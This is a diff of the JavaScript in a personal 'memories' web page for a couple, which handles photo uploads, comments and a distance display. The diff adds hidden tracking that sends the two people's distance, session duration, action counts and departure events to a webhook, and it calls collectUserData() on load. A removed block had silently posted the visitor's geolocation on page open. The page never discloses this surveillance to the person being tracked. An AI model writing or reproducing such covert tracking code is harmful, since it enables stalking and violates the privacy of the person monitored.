+    const R = 6371;
+    const dLat = (loc2.lat - loc1.lat) * Math.PI / 180;
+    const dLon = (loc2.lon - loc1.lon) * Math.PI / 180;
+    const a = Math.sin(dLat/2)**2 + Math.cos(loc1.lat * Math.PI/180) * Math.cos(loc2.lat * Math.PI/180) * Math.sin(dLon/2)**2;
+    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+    const distance = (R * c).toFixed(2);
+
+    document.getElementById('distanceValue').textContent = distance;
+    document.getElementById('distanceDisplay').style.display = 'block';
+
+    sendWebhook(`📏 **Distance Update**\nDistance between Yousef & Noran: **${distance} km** ❤️`);
+}
+
+const savedLoc2 = localStorage.getItem('loc2');
+if(savedLoc2) {
+    const loc = JSON.parse(savedLoc2);
+    updateLocation2(loc.lat, loc.lon);
+    calculateDistance();
+}
+
+// ====== MEMORY FORM HELPERS ======
+function toggleMemoryForm() {
     const form = document.getElementById("memoryForm");
     form.style.display = form.style.display === "none" ? "block" : "none";
-    if (form.style.display === "none") {
-        clearFormOutputs();
-    }
+    if(form.style.display === "none") clearFormOutputs();
+    logActivity('Toggled memory form');
 }
 
 function clearFormOutputs() {
@@ -736,103 +899,29 @@ function clearFormOutputs() {
     previewBox.innerHTML = "";
 }
 
-/* FILE INTERACTION & PREVIEW BETTER QUALITY */
 let currentImgBase64 = "";
 function handleFileSelect(input) {
     const file = input.files[0];
     const status = document.getElementById("uploadStatus");
     const previewBox = document.getElementById("imagePreviewBox");
-    
-    if(!file) {
-        currentImgBase64 = "";
-        clearFormOutputs();
-        return;
-    }
-
-    // حماية تفادي أحجام الملفات الكبيرة لتجنب مشاكل الذاكرة
-    if (file.size > 3 * 1024 * 1024) { 
-        alert("The image is too large! Please choose an image smaller than 3MB.");
-        input.value = "";
-        return;
-    }
-
+    if(!file) {currentImgBase64 = ""; clearFormOutputs(); return;}
+    if(file.size > 3 * 1024 * 1024) {alert("Image too large! Max 3MB."); input.value = ""; return;}
     const reader = new FileReader();
     reader.onload = function(e) {
         currentImgBase64 = e.target.result;
-        status.style.display = "block"; // إظهار إشعار الإضافة الناجحة
-        
-        // إنشاء الـ Preview الأوضح
+        window.currentImgBase64 = currentImgBase64;
+        status.style.display = "block";
         previewBox.innerHTML = `<img src="${currentImgBase64}" alt="Preview">`;
         previewBox.style.display = "block";
-    };
-    reader.onerror = function() {
-        console.error("FileReader failed to process the file securely.");
     };
     reader.readAsDataURL(file);
 }
 
-/* SAVE MEMORY */
-function saveMemory(){
-    const text = document.getElementById("memoryText").value;
-    if(text.trim() === "" && !currentImgBase64) return;
-
-    let memories = JSON.parse(localStorage.getItem("memories") || "[]");
-    memories.push({
-        text: text,
-        image: currentImgBase64,
-        comments: []
-    });
-
-    try {
-        localStorage.setItem("memories", JSON.stringify(memories));
-    } catch(e) {
-        alert("Local storage is full! Try saving a smaller image.");
-        return;
-    }
-
-    renderMemories();
-    showToast("Memory saved successfully! ✨❤️", "#4caf50");
-
-    // Reset Form
-    document.getElementById("memoryText").value = "";
-    document.getElementById("memoryImage").value = "";
-    currentImgBase64 = "";
-    clearFormOutputs();
-    document.getElementById("memoryForm").style.display = "none";
-}
-
-/* RENDER MEMORIES */
-function renderMemories(){
-    const container = document.getElementById("memories");
-    container.innerHTML = "";
-    let memories = JSON.parse(localStorage.getItem("memories") || "[]");
-
-    memories.forEach((m, index) => {
-        const div = document.createElement("div");
-        div.className = "memory-card";
-        div.innerHTML = `
-            ${m.image ? `<img src="${m.image}" alt="Memory Image">` : ""}
-            <div class="memory-content">
-                <div class="memory-text">${escapeHTML(m.text)}</div>
-                <button class="delete-btn" onclick="deleteMemory(${index})">Delete</button>
-                <div class="comment-box">
-                    <textarea id="comment-${index}" placeholder="Write a comment... ❤️"></textarea>
-                    <button class="comment-send-btn" onclick="addComment(${index})">Send</button>
-                    <div id="comments-list-${index}"></div>
-                </div>
-            </div>
-        `;
-        container.appendChild(div);
-        renderCommentsOnly(index, m.comments);
-    });
-}
-
-/* MEMORY RENDERING UX OPTIMIZATION FOR COMMENTS */
 function renderCommentsOnly(index, comments) {
     const listContainer = document.getElementById(`comments-list-${index}`);
-    if (!listContainer) return;
+    if(!listContainer) return;
     listContainer.innerHTML = "";
-    comments.forEach(c => {
+    (comments || []).forEach(c => {
         const comment = document.createElement("div");
         comment.className = "comment";
         comment.innerText = c;
@@ -840,61 +929,57 @@ function renderCommentsOnly(index, comments) {
     });
 }
 
-function addComment(index){
-    const inputElement = document.getElementById(`comment-${index}`);
-    const text = inputElement.value;
-    if(text.trim() === "") return;
-
-    let memories = JSON.parse(localStorage.getItem("memories") || "[]");
-    memories[index].comments.push(text);
-    localStorage.setItem("memories", JSON.stringify(memories));
-
-    // تحديث التعليقات محلياً فوراً بدون إعادة بناء الكروت بالكامل لضمان أداء خارق وسريع جداً
-    renderCommentsOnly(index, memories[index].comments);
-    inputElement.value = "";
-}
-
-function deleteMemory(index){
-    if(!confirm("If you are sure, this memory will be deleted forever 💔")) return;
-
-    let memories = JSON.parse(localStorage.getItem("memories") || "[]");
-    memories.splice(index,1);
-    localStorage.setItem("memories", JSON.stringify(memories));
-    renderMemories();
-}
-
-/* CUSTOM TOAST SYSTEM */
 function showToast(message, color = "#4caf50") {
     const toast = document.getElementById("successToast");
     toast.innerText = message;
     toast.style.background = color;
     toast.style.display = "block";
-    setTimeout(() => {
-        toast.style.display = "none";
-    }, 3500);
+    setTimeout(() => {toast.style.display = "none";}, 3500);
 }
 
-/* PROTECTION SECURE HTML */
 function escapeHTML(str) {
-    return str.replace(/[&<>'"]/g, 
-        tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag] || tag)
-    );
+    return str.replace(/[&<>'"]/g, tag => ({'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[tag] || tag));
 }
 
-// Initial Load
-renderMemories();
-
-/* SYSTEM TRACKS EXCEPTION */
-try {
-    navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        sendWebhook("📍 Someone opened the website!\nhttps://www.google.com/maps?q=" + lat + "," + lon);
+// ====== SCROLL ANIMATIONS ======
+const observerOptions = {threshold: 0.1, rootMargin: '0px 0px -50px 0px'};
+const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+        if(entry.isIntersecting) {
+            entry.target.style.opacity = '1';
+            entry.target.style.transform = 'translateY(0)';
+        }
     });
-} catch(e) {
-    console.log("Location access rejected or ignored safely.");
-}
-</script>
+}, observerOptions);
 
+document.querySelectorAll('.section').forEach(section => {
+    section.style.opacity = '0';
+    section.style.transform = 'translateY(30px)';
+    section.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+    observer.observe(section);
+});
+
+// ====== SESSION TIME TRACKING ======
+setInterval(() => {
+    const elapsed = Math.floor((Date.now() - sessionStart) / 1000);
+    const mins = Math.floor(elapsed / 60);
+    const secs = elapsed % 60;
+    if(elapsed % 30 === 0) {
+        sendWebhook(`⏱️ **Session Update**\n👤 User active for ${mins}m ${secs}s\n🖱️ Actions: ${activityLog.length}`);
+    }
+}, 1000);
+
+// ====== INITIALIZATION ======
+logActivity('Page loaded');
+
+window.addEventListener('beforeunload', () => {
+    const elapsed = Math.floor((Date.now() - sessionStart) / 1000);
+    const mins = Math.floor(elapsed / 60);
+    sendWebhook(`👋 **User Left**\n⏱️ Time spent: ${mins}m ${elapsed%60}s\n📊 Total actions: ${activityLog.length}`);
+});
+
+// Start everything
+collectUserData();
+</script>
 </body>
 </html>
